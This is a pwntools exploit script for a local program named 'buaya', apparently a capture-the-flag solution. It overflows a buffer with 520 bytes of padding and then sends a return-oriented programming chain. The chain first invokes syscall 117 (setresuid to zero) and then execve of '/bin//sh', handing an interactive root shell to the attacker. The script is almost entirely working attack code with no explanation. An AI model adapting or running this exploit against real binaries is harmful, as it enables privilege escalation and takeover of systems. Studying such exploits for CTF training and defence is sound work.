#!/usr/bin/python

from pwn import *

a = process('./buaya')

# add_data = 0x080ea060

from struct import pack

# Padding goes here
p = 'a'*520

p += pack('<Q', 0x0000000000401566) # : pop rdi ; ret
p += p64(0x00)
p += pack('<Q', 0x0000000000401687) # pop rsi ; ret
p += p64(0x00)
p += pack('<Q', 0x0000000000442eb6) # : pop rdx ; ret)
p += p64(0x00)

p += p64(0x0000000000466d70) # : mov rax, 1 ; ret)
for i in range(116):
	p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000467885) # syscall ; ret

p += pack('<Q', 0x0000000000401687) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca080) # @ .data
p += pack('<Q', 0x0000000000478be6) # pop rax ; pop rdx ; pop rbx ; ret
p += '/bin//sh'
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x0000000000474691) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401687) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004266bf) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474691) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401566) # pop rdi ; ret
p += pack('<Q', 0x00000000006ca080) # @ .data
p += pack('<Q', 0x0000000000401687) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x0000000000442eb6) # pop rdx ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004266bf) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000466d40) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000467885) # syscall ; ret


a.sendline(p)
# print a.recv()
a.interactive()